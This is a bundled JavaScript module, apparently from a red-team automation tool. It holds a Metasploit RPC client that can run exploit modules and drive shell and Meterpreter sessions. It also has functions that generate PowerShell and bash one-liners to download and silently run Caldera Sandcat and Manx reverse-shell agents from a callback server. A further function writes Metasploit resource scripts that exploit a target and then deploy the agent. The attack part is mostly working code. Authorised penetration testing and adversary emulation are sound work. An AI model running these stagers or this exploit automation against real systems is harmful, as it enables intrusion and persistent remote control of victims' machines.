import {
  createTunnelForServer,
  tunnelManager
} from "./chunk-XI75CWCV.js";
import {
  ENV,
  init_env
} from "./chunk-KDOLKO2A.js";

// server/lib/msf-client.ts
init_env();
import { Packr, Unpackr } from "msgpackr";
var packr = new Packr({ useRecords: false });
var unpackr = new Unpackr({ useRecords: false, mapsAsObjects: false });
var MsfClient = class _MsfClient {
  constructor(config) {
    this.requestId = 0;
    this.token = null;
    this.config = config;
    if (config.token) {
      this.token = config.token;
    }
  }
  /**
   * Create a client from ENV vars (global MSF instance).
   */
  static fromEnv() {
    if (!ENV.MSF_RPC_HOST) return null;
    return new _MsfClient({
      host: ENV.MSF_RPC_HOST,
      port: ENV.MSF_RPC_PORT,
      user: ENV.MSF_RPC_USER,
      pass: ENV.MSF_RPC_PASS,
      ssl: ENV.MSF_RPC_SSL
    });
  }
  /**
   * Create a client from a server config record.
   */
  static fromServerConfig(server) {
    if (!server.ipAddress) return null;
    return new _MsfClient({
      host: server.ipAddress,
      port: server.rpcPort || 55553,
      user: server.rpcUser || "msf",
      pass: server.rpcPass || "",
      ssl: server.rpcSsl ?? false,
      token: server.rpcToken || void 0
    });
  }
  /**
   * Create a tunnel-aware client for an exploit server.
   * Establishes SSH tunnel first, then connects via localhost.
   */
  static async fromServerWithTunnel(server) {
    if (!server.ipAddress) return null;
    const tunnelId = `msf-tunnel-${server.id}`;
    let host = server.ipAddress;
    let port = server.rpcPort || 55553;
    if (server.sshTunnelEnabled !== false) {
      const existingPort = tunnelManager.getLocalPort(tunnelId);
      if (existingPort && tunnelManager.isConnected(tunnelId)) {
        host = "127.0.0.1";
        port = existingPort;
      } else {
        const result = await createTunnelForServer({
          id: server.id,
          ipAddress: server.ipAddress,
          rpcPort: server.rpcPort,
          sshUser: server.sshUser,
          sshKeyPath: server.sshKeyPath
        });
        host = "127.0.0.1";
        port = result.localPort;
      }
    }
    return new _MsfClient({
      host,
      port,
      user: server.rpcUser || "msf",
      pass: server.rpcPass || "",
      ssl: false,
      // No SSL needed through tunnel
      token: server.rpcToken || void 0
    });
  }
  // ─── Low-Level RPC ────────────────────────────────────────────────────
  get baseUrl() {
    const proto = this.config.ssl ? "https" : "http";
    return `${proto}://${this.config.host}:${this.config.port}`;
  }
  /**
   * Convert Ruby MessagePack binary-key Maps to plain JS objects.
   * Ruby's msgpack encodes string keys as binary (bin type),
   * which msgpackr decodes as Buffer keys in Maps.
   */
  convertMapToObject(value) {
    if (value instanceof Map) {
      const obj = {};
      value.forEach((v, k) => {
        const key = Buffer.isBuffer(k) ? k.toString("utf8") : String(k);
        obj[key] = this.convertMapToObject(v);
      });
      return obj;
    }
    if (Buffer.isBuffer(value)) {
      return value.toString("utf8");
    }
    if (Array.isArray(value)) {
      return value.map((v) => this.convertMapToObject(v));
    }
    return value;
  }
  /**
   * Send a MessagePack RPC request to the MSF instance.
   * This is the native msfrpcd protocol.
   */
  async rpc(method, params = []) {
    this.requestId++;
    const callArgs = this.token && !method.startsWith("auth.login") ? [method, this.token, ...params] : [method, ...params];
    const packed = packr.pack(callArgs);
    try {
      const resp = await fetch(`${this.baseUrl}/api/`, {
        method: "POST",
        headers: {
          "Content-Type": "binary/message-pack",
          "Accept": "binary/message-pack"
        },
        body: packed,
        signal: AbortSignal.timeout(3e4)
      });
      if (!resp.ok) {
        throw new Error(`MSF RPC HTTP ${resp.status}: ${await resp.text().catch(() => "unknown")}`);
      }
      const buffer = Buffer.from(await resp.arrayBuffer());
      const raw = unpackr.unpack(buffer);
      const data = this.convertMapToObject(raw);
      if (data.error === true || data.error_class) {
        throw new Error(`MSF RPC Error: ${data.error_message || data.error_string || "Unknown error"}`);
      }
      return data;
    } catch (err) {
      if (err.name === "TypeError" || err.name === "AbortError") {
        throw new Error(`MSF RPC connection failed (${this.config.host}:${this.config.port}): ${err.message}`);
      }
      throw err;
    }
  }
  // ─── Authentication ───────────────────────────────────────────────────
  /**
   * Authenticate with the MSF RPC service.
   * Returns the auth token on success.
   */
  async login() {
    const result = await this.rpc("auth.login", [this.config.user, this.config.pass]);
    if (result?.result === "success" && result?.token) {
      this.token = result.token;
      return result.token;
    }
    throw new Error("MSF RPC authentication failed");
  }
  /**
   * Logout and invalidate the current token.
   */
  async logout() {
    if (!this.token) return;
    try {
      await this.rpc("auth.logout", [this.token]);
    } finally {
      this.token = null;
    }
  }
  /**
   * Check if we have a valid token (auto-login if needed).
   */
  async ensureAuth() {
    if (this.token) {
      try {
        await this.rpc("core.version");
        return;
      } catch {
        this.token = null;
      }
    }
    await this.login();
  }
  get currentToken() {
    return this.token;
  }
  // ─── Core ─────────────────────────────────────────────────────────────
  /**
   * Get MSF version info.
   */
  async getVersion() {
    await this.ensureAuth();
    return this.rpc("core.version");
  }
  /**
   * Get module statistics.
   */
  async getModuleStats() {
    await this.ensureAuth();
    return this.rpc("core.module_stats");
  }
  // ─── Module Operations ────────────────────────────────────────────────
  /**
   * Search for modules by keyword.
   */
  async searchModules(query) {
    await this.ensureAuth();
    const result = await this.rpc("module.search", [query]);
    return Array.isArray(result) ? result : [];
  }
  /**
   * Get detailed info about a module.
   */
  async getModuleInfo(moduleType, moduleName) {
    await this.ensureAuth();
    return this.rpc("module.info", [moduleType, moduleName]);
  }
  /**
   * Get options for a module.
   */
  async getModuleOptions(moduleType, moduleName) {
    await this.ensureAuth();
    return this.rpc("module.options", [moduleType, moduleName]);
  }
  /**
   * Get compatible payloads for an exploit module.
   */
  async getCompatiblePayloads(moduleName) {
    await this.ensureAuth();
    const result = await this.rpc("module.compatible_payloads", [moduleName]);
    return result?.payloads || [];
  }
  /**
   * Run a module check (verify if target is vulnerable).
   */
  async checkModule(moduleType, moduleName, options) {
    await this.ensureAuth();
    return this.rpc("module.check", [moduleType, moduleName, options]);
  }
  /**
   * Execute a module (exploit, auxiliary, post, or payload).
   */
  async executeModule(moduleType, moduleName, options) {
    await this.ensureAuth();
    return this.rpc("module.execute", [moduleType, moduleName, options]);
  }
  /**
   * Get running module statistics.
   */
  async getRunningStats() {
    await this.ensureAuth();
    return this.rpc("module.running_stats");
  }
  // ─── Session Management ───────────────────────────────────────────────
  /**
   * List all active sessions.
   */
  async listSessions() {
    await this.ensureAuth();
    const result = await this.rpc("session.list");
    return result || {};
  }
  /**
   * Stop/kill a session.
   */
  async stopSession(sessionId) {
    await this.ensureAuth();
    await this.rpc("session.stop", [sessionId]);
  }
  /**
   * Write to a shell session.
   */
  async shellWrite(sessionId, command) {
    await this.ensureAuth();
    const result = await this.rpc("session.shell_write", [sessionId, command]);
    return result?.write_count || 0;
  }
  /**
   * Read from a shell session.
   */
  async shellRead(sessionId, readPointer) {
    await this.ensureAuth();
    const params = readPointer ? [sessionId, readPointer] : [sessionId];
    return this.rpc("session.shell_read", params);
  }
  /**
   * Write to a Meterpreter session.
   */
  async meterpreterWrite(sessionId, command) {
    await this.ensureAuth();
    await this.rpc("session.meterpreter_write", [sessionId, command]);
  }
  /**
   * Read from a Meterpreter session.
   */
  async meterpreterRead(sessionId) {
    await this.ensureAuth();
    const result = await this.rpc("session.meterpreter_read", [sessionId]);
    return result?.data || "";
  }
  // ─── Job Management ───────────────────────────────────────────────────
  /**
   * List all running jobs.
   */
  async listJobs() {
    await this.ensureAuth();
    return this.rpc("job.list");
  }
  /**
   * Get detailed info about a job.
   */
  async getJobInfo(jobId) {
    await this.ensureAuth();
    return this.rpc("job.info", [jobId]);
  }
  /**
   * Stop a running job.
   */
  async stopJob(jobId) {
    await this.ensureAuth();
    await this.rpc("job.stop", [jobId]);
  }
  // ─── Console Operations ───────────────────────────────────────────────
  /**
   * Create a new console.
   */
  async createConsole() {
    await this.ensureAuth();
    return this.rpc("console.create");
  }
  /**
   * Write to a console.
   */
  async consoleWrite(consoleId, command) {
    await this.ensureAuth();
    const result = await this.rpc("console.write", [consoleId, command]);
    return result?.wrote || 0;
  }
  /**
   * Read from a console.
   */
  async consoleRead(consoleId) {
    await this.ensureAuth();
    return this.rpc("console.read", [consoleId]);
  }
  /**
   * Destroy a console.
   */
  async destroyConsole(consoleId) {
    await this.ensureAuth();
    await this.rpc("console.destroy", [consoleId]);
  }
  /**
   * List all consoles.
   */
  async listConsoles() {
    await this.ensureAuth();
    return this.rpc("console.list");
  }
  // ─── Health Check ─────────────────────────────────────────────────────
  /**
   * Perform a health check on the MSF instance.
   * Returns version info and module counts if healthy.
   */
  async healthCheck() {
    try {
      await this.ensureAuth();
      const [version, stats, sessions, jobs] = await Promise.all([
        this.getVersion(),
        this.getModuleStats(),
        this.listSessions(),
        this.listJobs()
      ]);
      return {
        healthy: true,
        version,
        moduleStats: stats,
        sessionCount: Object.keys(sessions).length,
        jobCount: Object.keys(jobs).length
      };
    } catch (err) {
      return { healthy: false, error: err.message };
    }
  }
};
function generateAgentStagers(calderaUrl, group) {
  const agentGroup = group || "red";
  const stagers = [];
  stagers.push({
    type: "sandcat",
    platform: "windows",
    command: [
      `$server="${calderaUrl}";`,
      `$url="$server/file/download";`,
      `$wc=New-Object System.Net.WebClient;`,
      `$wc.Headers.add("platform","windows");`,
      `$wc.Headers.add("file","sandcat.go");`,
      `$wc.Headers.add("server","$server");`,
      `$wc.Headers.add("group","${agentGroup}");`,
      `$data=$wc.DownloadData($url);`,
      `$name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace('"',"");`,
      `[io.file]::WriteAllBytes("C:\\Users\\Public\\$name.exe",$data);`,
      `Start-Process -FilePath "C:\\Users\\Public\\$name.exe" -ArgumentList "-server $server -group ${agentGroup}" -WindowStyle Hidden;`
    ].join(""),
    description: "PowerShell one-liner to download and execute Sandcat agent on Windows",
    callbackUrl: calderaUrl
  });
  stagers.push({
    type: "sandcat",
    platform: "linux",
    command: [
      `server="${calderaUrl}";`,
      `curl -s -X POST $server/file/download `,
      `-H "file:sandcat.go" -H "platform:linux" `,
      `-H "server:$server" -H "group:${agentGroup}" `,
      `-o /tmp/sandcat;`,
      `chmod +x /tmp/sandcat;`,
      `nohup /tmp/sandcat -server $server -group ${agentGroup} &>/dev/null &`
    ].join(""),
    description: "Bash one-liner to download and execute Sandcat agent on Linux",
    callbackUrl: calderaUrl
  });
  stagers.push({
    type: "sandcat",
    platform: "darwin",
    command: [
      `server="${calderaUrl}";`,
      `curl -s -X POST $server/file/download `,
      `-H "file:sandcat.go" -H "platform:darwin" `,
      `-H "server:$server" -H "group:${agentGroup}" `,
      `-o /tmp/sandcat;`,
      `chmod +x /tmp/sandcat;`,
      `nohup /tmp/sandcat -server $server -group ${agentGroup} &>/dev/null &`
    ].join(""),
    description: "Bash one-liner to download and execute Sandcat agent on macOS",
    callbackUrl: calderaUrl
  });
  stagers.push({
    type: "manx",
    platform: "windows",
    command: [
      `$server="${calderaUrl}";`,
      `$url="$server/file/download";`,
      `$wc=New-Object System.Net.WebClient;`,
      `$wc.Headers.add("platform","windows");`,
      `$wc.Headers.add("file","manx.go");`,
      `$wc.Headers.add("server","$server");`,
      `$wc.Headers.add("group","${agentGroup}");`,
      `$data=$wc.DownloadData($url);`,
      `$name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace('"',"");`,
      `[io.file]::WriteAllBytes("C:\\Users\\Public\\$name.exe",$data);`,
      `Start-Process -FilePath "C:\\Users\\Public\\$name.exe" -ArgumentList "-server $server -group ${agentGroup}" -WindowStyle Hidden;`
    ].join(""),
    description: "PowerShell one-liner to download and execute Manx reverse shell agent on Windows",
    callbackUrl: calderaUrl
  });
  stagers.push({
    type: "manx",
    platform: "linux",
    command: [
      `server="${calderaUrl}";`,
      `curl -s -X POST $server/file/download `,
      `-H "file:manx.go" -H "platform:linux" `,
      `-H "server:$server" -H "group:${agentGroup}" `,
      `-o /tmp/manx;`,
      `chmod +x /tmp/manx;`,
      `nohup /tmp/manx -server $server -group ${agentGroup} &>/dev/null &`
    ].join(""),
    description: "Bash one-liner to download and execute Manx reverse shell agent on Linux",
    callbackUrl: calderaUrl
  });
  return stagers;
}
function generateMsfResourceScript(params) {
  const {
    exploitModule,
    targetIp,
    targetPort,
    payloadModule,
    calderaUrl,
    calderaGroup = "red",
    lhost,
    lport = 4444,
    additionalOptions = {}
  } = params;
  const lines = [
    `# Auto-generated Metasploit resource script`,
    `# Target: ${targetIp}${targetPort ? `:${targetPort}` : ""}`,
    `# Exploit: ${exploitModule}`,
    `# Generated: ${(/* @__PURE__ */ new Date()).toISOString()}`,
    ``,
    `use ${exploitModule}`,
    `set RHOSTS ${targetIp}`
  ];
  if (targetPort) lines.push(`set RPORT ${targetPort}`);
  if (payloadModule) {
    lines.push(`set PAYLOAD ${payloadModule}`);
  }
  lines.push(`set LHOST ${lhost}`);
  lines.push(`set LPORT ${lport}`);
  for (const [key, value] of Object.entries(additionalOptions)) {
    lines.push(`set ${key} ${value}`);
  }
  const stagerCmd = [
    `server="${calderaUrl}";`,
    `curl -s -X POST $server/file/download `,
    `-H "file:sandcat.go" -H "platform:linux" `,
    `-H "server:$server" -H "group:${calderaGroup}" `,
    `-o /tmp/sandcat && chmod +x /tmp/sandcat && `,
    `nohup /tmp/sandcat -server $server -group ${calderaGroup} &>/dev/null &`
  ].join("");
  lines.push(``);
  lines.push(`# Post-exploitation: Deploy Caldera agent`);
  lines.push(`set AutoRunScript "multi_console_command -cl 'shell','${stagerCmd}'"`);
  lines.push(``);
  lines.push(`# Execute`);
  lines.push(`exploit -j`);
  lines.push(``);
  return lines.join("\n");
}

export {
  MsfClient,
  generateAgentStagers,
  generateMsfResourceScript
};
